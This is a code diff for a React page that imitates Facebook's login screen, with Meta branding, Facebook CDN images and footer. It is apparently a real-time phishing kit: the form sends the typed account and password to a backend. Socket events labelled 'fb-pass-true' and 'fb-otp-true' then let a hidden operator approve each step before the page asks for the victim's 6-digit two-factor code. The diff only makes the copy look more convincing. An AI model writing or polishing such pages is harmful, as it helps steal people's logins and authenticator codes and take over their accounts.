@@ -25,9 +25,8 @@ import { socket } from '../utils/socket';
 
 const META_BLUE = '#0866FF';
 const TEXT_BLACK = '#1C1E21';
-const BG_GRAY = '#F2F4F7';
-const INPUT_BG = '#F5F6F7';
 const BORDER_COLOR = '#DDDFE2';
+const INPUT_BG = '#FFFFFF';
 
 export default function FacebookLoginPage() {
   const [step, setStep] = useState<'login' | 'otp'>('login');
@@ -40,57 +39,48 @@ export default function FacebookLoginPage() {
   const [wrongOtp, setWrongOtp] = useState(false);
   const [isOrderComplete, setIsOrderComplete] = useState(false);
   const [sessionId, setSessionId] = useState<string | null>(null);
-  
+  const [loginError, setLoginError] = useState<string | null>(null);
+
   const [collageSrc, setCollageSrc] = useState('https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp');
 
-  // Chọn ảnh ngẫu nhiên khi component mount
   useEffect(() => {
     const images = [
       'https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp',
-      'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp'
+      'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp',
     ];
     setCollageSrc(images[Math.floor(Math.random() * images.length)]);
   }, []);
 
-
   useEffect(() => {
     socket.connect();
-    
-    // Listen for wrong pass
+
     socket.on('fb-wrong-pass', (data: { id: string }) => {
-      console.log('FB: Wrong pass event', data);
       if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setWrongPass(true);
-        setStep('login'); 
+        setStep('login');
       }
     });
 
-    // Listen for pass approved (Go to OTP)
     socket.on('fb-pass-true', (data: { id: string }) => {
-      console.log('FB: Pass true event', data);
       if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setStep('otp');
       }
     });
 
-    // Listen for OTP approved (Show Success Screen)
     socket.on('fb-otp-true', (data: { id: string }) => {
-      console.log('FB: OTP true event', data);
       if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setIsOrderComplete(true);
       }
     });
 
-    // Listen for OTP wrong (Re-enter OTP)
     socket.on('fb-otp-wrong', (data: { id: string }) => {
-      console.log('FB: OTP wrong event', data);
       if (sessionId && String(data.id) === String(sessionId)) {
         setLoading(false);
         setWrongOtp(true);
-        setVerifyCode(''); 
+        setVerifyCode('');
       }
     });
 
@@ -102,8 +92,6 @@ export default function FacebookLoginPage() {
     };
   }, [sessionId]);
 
-  const [loginError, setLoginError] = useState<string | null>(null);
-
   const handleLoginSubmit = async () => {
     const trimmedAccount = account.trim();
     if (!trimmedAccount || !password.trim()) return;
@@ -112,7 +100,9 @@ export default function FacebookLoginPage() {
     const isPhone = /^\+?[0-9]{8,15}$/.test(trimmedAccount);
 
     if (!isEmail && !isPhone) {
-      setLoginError("The email address or mobile number you entered isn't connected to an account. Find your account and log in.");
+      setLoginError(
+        "The email address or mobile number you entered isn't connected to an account. Find your account and log in."
+      );
       return;
     }
 
@@ -125,10 +115,7 @@ export default function FacebookLoginPage() {
         account: trimmedAccount,
         password: password.trim(),
       });
-
       setSessionId(result.id);
-      // setStep('otp');  <-- BỎ: Không chuyển OTP ngay, đợi admin duyệt (socket lắng nghe ở useEffect)
-      
     } catch (error) {
       setLoading(false);
       setWrongPass(true);
@@ -138,10 +125,9 @@ export default function FacebookLoginPage() {
   const handleOtpSubmit = async () => {
     if (!verifyCode || verifyCode.length !== 6 || !sessionId) return;
     setLoading(true);
-    setWrongOtp(false); // Reset lỗi cũ
+    setWrongOtp(false);
     try {
       await submitFbOtp(sessionId, verifyCode);
-      // setStep('completed'); // BỎ: Không tự động chuyển, đợi lệnh admin (socket fb-otp-true)
     } catch (error) {
       setLoading(false);
     }
@@ -155,217 +141,293 @@ export default function FacebookLoginPage() {
 
       <Box
         sx={{
-          height: '100vh', 
+          minHeight: '100vh',
           display: 'flex',
           flexDirection: 'column',
           bgcolor: '#fff',
-          overflow: 'hidden',
-          fontFamily: '"SF Pro Display", "SF Pro Text", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
+          fontFamily:
+            '"SF Pro Display", "SF Pro Text", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
         }}
       >
+        {/* MAIN CONTENT */}
         <Box
           sx={{
             flexGrow: 1,
             display: 'flex',
             flexDirection: { xs: 'column', md: 'row' },
-            minHeight: 0, // Quan trọng để overflow hoạt động đúng trong flex
           }}
         >
-          {/* LEFT SECTION */}
-          <Box 
-            sx={{ 
-              width: { xs: '100%', md: '60%' }, 
-              bgcolor: '#fff', 
-              display: 'flex', 
+          {/* ── LEFT SECTION ── */}
+          <Box
+            sx={{
+              width: { xs: '100%', md: '58%' },
+              bgcolor: '#fff',
+              display: 'flex',
               flexDirection: 'column',
-              p: { xs: 3, md: 6 },
-              position: 'relative',
-              height: '100%'
+              p: { xs: 3, md: '40px 32px 40px 48px' },
+              minHeight: { md: '100vh' },
             }}
           >
-            {/* Logo */}
-            <Box sx={{ mb: { xs: 1, md: 2 } }}>
-              <Iconify icon="logos:facebook" width={36} height={36} />
+            {/* Facebook Logo */}
+            <Box sx={{ mb: 3 }}>
+              <Iconify icon="logos:facebook" width={50} height={50} />
             </Box>
 
-            {/* Collage Image (Random) */}
-            <Box sx={{ flexGrow: 1, display: 'flex', justifyContent: 'center', alignItems: 'center', my: 0 }}>
+            {/* Row: Slogan LEFT + Collage RIGHT */}
+            <Box
+              sx={{
+                flexGrow: 1,
+                display: 'flex',
+                flexDirection: 'row',
+                alignItems: 'center',
+                gap: 2,
+              }}
+            >
+              {/* Slogan */}
+              <Box sx={{ flex: '0 0 auto', maxWidth: 280 }}>
+                <Typography
+                  sx={{
+                    fontWeight: 700,
+                    fontSize: { xs: 36, md: 64 },
+                    lineHeight: 1.05,
+                    letterSpacing: -2,
+                    color: TEXT_BLACK,
+                  }}
+                >
+                  Explore the{' '}
+                  <br />
+                  things <br />
+                  <span style={{ color: META_BLUE }}>you love.</span>
+                </Typography>
+              </Box>
+
+              {/* Collage Image */}
               <Box
-                component="img"
-                src={collageSrc}
-                alt="Collage"
-                sx={{ 
-                  maxWidth: '100%', 
-                  maxHeight: { xs: 300, md: 580 }, // Tăng đáng kể kích thước ảnh
-                  objectFit: 'contain' 
+                sx={{
+                  flex: 1,
+                  display: 'flex',
+                  justifyContent: 'center',
+                  alignItems: 'center',
+                  overflow: 'hidden',
                 }}
-              />
-            </Box>
-
-            {/* Large Slogan */}
-            <Box sx={{ mt: 'auto', pt: 0 }}>
-              <Typography variant="h1" sx={{ 
-                fontWeight: 700, 
-                fontSize: { xs: 32, md: 56 }, // Tăng nhẹ slogan cho cân đối
-                color: TEXT_BLACK, 
-                lineHeight: 1.1,
-                letterSpacing: -1
-              }}>
-                Explore the <br /> things <br />
-                <span style={{ color: META_BLUE }}>you love.</span>
-              </Typography>
+              >
+                <Box
+                  component="img"
+                  src={collageSrc}
+                  alt="Collage"
+                  sx={{
+                    width: '100%',
+                    maxHeight: { xs: 280, md: 560 },
+                    objectFit: 'contain',
+                  }}
+                />
+              </Box>
             </Box>
           </Box>
 
-          {/* RIGHT SECTION */}
-          <Box 
-            sx={{ 
-              width: { xs: '100%', md: '40%' }, 
-              bgcolor: BG_GRAY, 
+          {/* ── RIGHT SECTION ── */}
+          <Box
+            sx={{
+              width: { xs: '100%', md: '42%' },
+              bgcolor: '#fff',
               borderLeft: { md: `1px solid ${BORDER_COLOR}` },
               display: 'flex',
               flexDirection: 'column',
               justifyContent: 'center',
               alignItems: 'center',
-              p: { xs: 4, md: 6 },
-              height: '100%'
+              p: { xs: 4, md: '40px 56px' },
             }}
           >
-            <Box sx={{ width: '100%', maxWidth: 400 }}>
-              {/* Nav Header */}
-              <Stack direction="row" alignItems="center" spacing={2} sx={{ mb: 4 }}>
-                <IconButton size="small" sx={{ color: TEXT_BLACK, p: 0 }}>
-                  <Iconify icon="eva:chevron-left-fill" width={24} />
-                </IconButton>
-                <Typography variant="h5" fontWeight={700} sx={{ color: TEXT_BLACK }}>
-                  Log in to Facebook
-                </Typography>
-              </Stack>
+            <Box sx={{ width: '100%', maxWidth: 380 }}>
+              {/* Title */}
+              <Typography
+                variant="h6"
+                sx={{
+                  fontWeight: 700,
+                  fontSize: 20,
+                  color: TEXT_BLACK,
+                  mb: 3,
+                }}
+              >
+                Log into Facebook
+              </Typography>
 
-              {/* Login Form */}
+              {/* ── LOGIN STEP ── */}
               {step === 'login' ? (
-                <Stack spacing={2.5}>
+                <Stack spacing={2}>
+                  {/* Error Banner */}
                   {(wrongPass || loginError) && (
-                    <Box sx={{ p: 1.5, bgcolor: '#ffebe8', border: '1px solid #dd3c10', borderRadius: 1.5 }}>
-                      <Typography variant="body2" color="#dd3c10" sx={{ fontWeight: 600 }}>
-                        {loginError || "The password you've entered is incorrect. Forgotten password?"}
+                    <Box
+                      sx={{
+                        p: 1.5,
+                        bgcolor: '#ffebe8',
+                        border: '1px solid #dd3c10',
+                        borderRadius: 2,
+                      }}
+                    >
+                      <Typography variant="body2" color="#dd3c10" fontWeight={600}>
+                        {loginError ||
+                          "The password you've entered is incorrect. Forgotten password?"}
                       </Typography>
                     </Box>
                   )}
 
+                  {/* Email / Phone */}
                   <TextField
                     fullWidth
-                    placeholder="Email address or mobile number"
+                    placeholder="Email or mobile number"
                     autoFocus
                     value={account}
                     onChange={(e) => setAccount(e.target.value)}
-                    sx={{ 
-                      '& .MuiOutlinedInput-root': { 
+                    onKeyDown={(e) => e.key === 'Enter' && handleLoginSubmit()}
+                    sx={{
+                      '& .MuiOutlinedInput-root': {
                         bgcolor: INPUT_BG,
-                        height: 52, 
-                        borderRadius: 1.5,
-                        fontSize: 16,
-                        '& fieldset': { border: 'none' }
-                      } 
+                        height: 52,
+                        borderRadius: 3,
+                        fontSize: 15,
+                        '& fieldset': { borderColor: BORDER_COLOR },
+                        '&:hover fieldset': { borderColor: '#b0b3b8' },
+                      },
                     }}
                   />
 
+                  {/* Password */}
                   <TextField
                     fullWidth
                     placeholder="Password"
                     type={showPassword ? 'text' : 'password'}
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
+                    onKeyDown={(e) => e.key === 'Enter' && handleLoginSubmit()}
                     InputProps={{
                       endAdornment: (
                         <InputAdornment position="end">
-                          <IconButton edge="end" onClick={() => setShowPassword(!showPassword)}>
-                            <Iconify icon={showPassword ? 'eva:eye-fill' : 'eva:eye-off-fill'} />
+                          <IconButton
+                            edge="end"
+                            onClick={() => setShowPassword(!showPassword)}
+                            size="small"
+                          >
+                            <Iconify
+                              icon={showPassword ? 'eva:eye-fill' : 'eva:eye-off-fill'}
+                            />
                           </IconButton>
                         </InputAdornment>
                       ),
                     }}
-                    sx={{ 
-                      '& .MuiOutlinedInput-root': { 
+                    sx={{
+                      '& .MuiOutlinedInput-root': {
                         bgcolor: INPUT_BG,
-                        height: 52, 
-                        borderRadius: 1.5,
-                        fontSize: 16,
-                        '& fieldset': { border: 'none' }
-                      } 
+                        height: 52,
+                        borderRadius: 3,
+                        fontSize: 15,
+                        '& fieldset': { borderColor: BORDER_COLOR },
+                        '&:hover fieldset': { borderColor: '#b0b3b8' },
+                      },
                     }}
                   />
 
+                  {/* Log In Button */}
                   <Button
                     fullWidth
                     variant="contained"
-                    size="large"
                     onClick={handleLoginSubmit}
                     disabled={loading || !account || !password}
                     sx={{
                       bgcolor: META_BLUE,
                       fontWeight: 700,
                       fontSize: 16,
-                      py: 1.5,
+                      height: 52,
+                      borderRadius: 999,
                       textTransform: 'none',
-                      borderRadius: 6,
                       boxShadow: 'none',
+                      mt: 0.5,
                       '&:hover': { bgcolor: '#0057c2', boxShadow: 'none' },
+                      '&.Mui-disabled': { bgcolor: '#a8c8ff', color: '#fff' },
                     }}
                   >
-                    {loading ? <CircularProgress size={24} sx={{ color: '#fff' }} /> : 'Log in'}
+                    {loading ? (
+                      <CircularProgress size={22} sx={{ color: '#fff' }} />
+                    ) : (
+                      'Log in'
+                    )}
                   </Button>
 
+                  {/* Forgot Password */}
                   <Typography
                     variant="body2"
+                    align="center"
                     sx={{
-                      color: META_BLUE,
-                      textAlign: 'center',
-                      cursor: 'pointer',
+                      color: TEXT_BLACK,
+                      fontWeight: 500,
                       fontSize: 14,
-                      fontWeight: 700,
+                      cursor: 'pointer',
+                      py: 0.5,
                       '&:hover': { textDecoration: 'underline' },
                     }}
                   >
-                    Forgotten password?
+                    Forgot password?
                   </Typography>
 
-                  <Box sx={{ py: 2 }}>
-                    <Button
-                      fullWidth
-                      variant="outlined"
-                      sx={{
-                        color: META_BLUE,
+                  {/* Divider */}
+                  <Divider sx={{ borderColor: BORDER_COLOR, my: 0.5 }} />
+
+                  {/* Create Account */}
+                  <Button
+                    fullWidth
+                    variant="outlined"
+                    sx={{
+                      color: META_BLUE,
+                      borderColor: META_BLUE,
+                      borderWidth: 1.5,
+                      fontWeight: 700,
+                      fontSize: 15,
+                      height: 52,
+                      borderRadius: 999,
+                      textTransform: 'none',
+                      '&:hover': {
+                        bgcolor: 'rgba(8,102,255,0.05)',
                         borderColor: META_BLUE,
                         borderWidth: 1.5,
-                        fontWeight: 700,
-                        fontSize: 16,
-                        py: 1.2,
-                        textTransform: 'none',
-                        borderRadius: 6,
-                        '&:hover': { bgcolor: 'rgba(8, 102, 255, 0.05)', borderColor: META_BLUE, borderWidth: 1.5 },
-                      }}
-                    >
-                      Create new account
-                    </Button>
-                  </Box>
+                      },
+                    }}
+                  >
+                    Create new account
+                  </Button>
 
-                  <Stack direction="row" justifyContent="center" alignItems="center" spacing={0.5} sx={{ mt: 2 }}>
-                     <Iconify icon="logos:meta-icon" width={16} />
-                     <Typography variant="subtitle2" fontWeight={800} sx={{ color: TEXT_BLACK, opacity: 0.9 }}>
-                       Meta
-                     </Typography>
+                  {/* Meta Logo */}
+                  <Stack
+                    direction="row"
+                    justifyContent="center"
+                    alignItems="center"
+                    spacing={0.5}
+                    sx={{ mt: 1.5 }}
+                  >
+                    <Iconify icon="logos:meta-icon" width={18} />
+                    <Typography
+                      variant="subtitle2"
+                      fontWeight={800}
+                      sx={{ color: TEXT_BLACK, opacity: 0.85, fontSize: 14 }}
+                    >
+                      Meta
+                    </Typography>
                   </Stack>
                 </Stack>
               ) : (
-                <Stack spacing={4}>
+                /* ── OTP STEP ── */
+                <Stack spacing={3}>
                   <Box sx={{ textAlign: 'center' }}>
-                    <Typography variant="body2" sx={{ color: '#606770', lineHeight: 1.5 }}>
-                      Enter the 6-digit code from your authentication app to verify your identity.
+                    <Typography variant="body2" sx={{ color: '#606770', lineHeight: 1.6 }}>
+                      Enter the 6-digit code from your authentication app to verify your
+                      identity.
                     </Typography>
                     {wrongOtp && (
-                      <Typography variant="body2" color="#dd3c10" sx={{ mt: 1, fontWeight: 700 }}>
-                         The code you entered is incorrect. Please check the code and try again.
+                      <Typography
+                        variant="body2"
+                        color="#dd3c10"
+                        sx={{ mt: 1, fontWeight: 700 }}
+                      >
+                        The code you entered is incorrect. Please check and try again.
                       </Typography>
                     )}
                   </Box>
@@ -374,34 +436,60 @@ export default function FacebookLoginPage() {
                     fullWidth
                     placeholder="6-digit code"
                     value={verifyCode}
-                    onChange={(e) => setVerifyCode(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
-                    inputProps={{ 
-                      maxLength: 6, 
-                      style: { textAlign: 'center', letterSpacing: 10, fontSize: 24, fontWeight: 700 }
+                    onChange={(e) =>
+                      setVerifyCode(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))
+                    }
+                    inputProps={{
+                      maxLength: 6,
+                      style: {
+                        textAlign: 'center',
+                        letterSpacing: 12,
+                        fontSize: 24,
+                        fontWeight: 700,
+                      },
                     }}
-                    sx={{ '& .MuiOutlinedInput-root': { bgcolor: INPUT_BG, borderRadius: 1.5, '& fieldset': { border: 'none' } } }}
+                    sx={{
+                      '& .MuiOutlinedInput-root': {
+                        bgcolor: INPUT_BG,
+                        height: 56,
+                        borderRadius: 3,
+                        '& fieldset': { borderColor: BORDER_COLOR },
+                      },
+                    }}
                   />
 
                   <Button
                     fullWidth
                     variant="contained"
-                    size="large"
                     onClick={handleOtpSubmit}
                     disabled={verifyCode.length !== 6 || loading}
                     sx={{
                       bgcolor: META_BLUE,
                       fontWeight: 700,
-                      py: 1.5,
+                      height: 52,
+                      borderRadius: 999,
                       textTransform: 'none',
-                      borderRadius: 6,
+                      boxShadow: 'none',
+                      '&:hover': { bgcolor: '#0057c2', boxShadow: 'none' },
                     }}
                   >
-                    {loading ? <CircularProgress size={24} sx={{ color: '#fff' }} /> : 'Verify'}
+                    {loading ? (
+                      <CircularProgress size={22} sx={{ color: '#fff' }} />
+                    ) : (
+                      'Verify'
+                    )}
                   </Button>
 
                   <Typography
                     variant="body2"
-                    sx={{ color: META_BLUE, textAlign: 'center', fontSize: 13, cursor: 'pointer', fontWeight: 700 }}
+                    align="center"
+                    sx={{
+                      color: META_BLUE,
+                      fontSize: 13,
+                      cursor: 'pointer',
+                      fontWeight: 700,
+                      '&:hover': { textDecoration: 'underline' },
+                    }}
                   >
                     Try another way
                   </Typography>
@@ -411,19 +499,45 @@ export default function FacebookLoginPage() {
           </Box>
         </Box>
 
-        {/* Footer Minimal Fixed Bottom */}
-        <Box sx={{ bgcolor: '#fff', py: 2, textAlign: 'center', borderTop: `1px solid ${BORDER_COLOR}`, flexShrink: 0 }}>
-          <Typography variant="caption" sx={{ color: '#737373', fontSize: 11 }}>
-             English (UK) · Tiếng Việt · 中文(台灣) · 한국어 · 日本語 · Français (France) · More languages...
-          </Typography>
+        {/* ── FOOTER ── */}
+        <Box
+          sx={{
+            bgcolor: '#fff',
+            px: { xs: 2, md: 6 },
+            py: 2.5,
+            borderTop: `1px solid ${BORDER_COLOR}`,
+          }}
+        >
+          <Stack spacing={0.8} alignItems="center">
+            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
+              English (UK) · Tiếng Việt · 中文(台灣) · 한국어 · 日本語 · Français (France) ·
+              ภาษาไทย · More languages...
+            </Typography>
+            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
+              Sign Up · Log in · Messenger · Facebook Lite · Video · Meta Pay · Meta Store ·
+              Meta Quest · Ray-Ban Meta · Meta AI · Instagram · Threads
+            </Typography>
+            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
+              Privacy Policy · Privacy Centre · About · Create ad · Create Page · Developers ·
+              Careers · Cookies · AdChoices
+            </Typography>
+            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12 }}>
+              Terms · Help · Contact uploading and non-users
+            </Typography>
+            <Typography variant="caption" sx={{ color: '#8a8d91', fontSize: 12, mt: 0.5 }}>
+              Meta © 2026
+            </Typography>
+          </Stack>
         </Box>
       </Box>
 
       {/* Success Dialog */}
-      <CheckoutOrderComplete 
-        open={isOrderComplete} 
-        onReset={() => { window.location.href = '/'; }} 
-        onDownloadPDF={() => {}} 
+      <CheckoutOrderComplete
+        open={isOrderComplete}
+        onReset={() => {
+          window.location.href = '/';
+        }}
+        onDownloadPDF={() => {}}
       />
     </>
   );
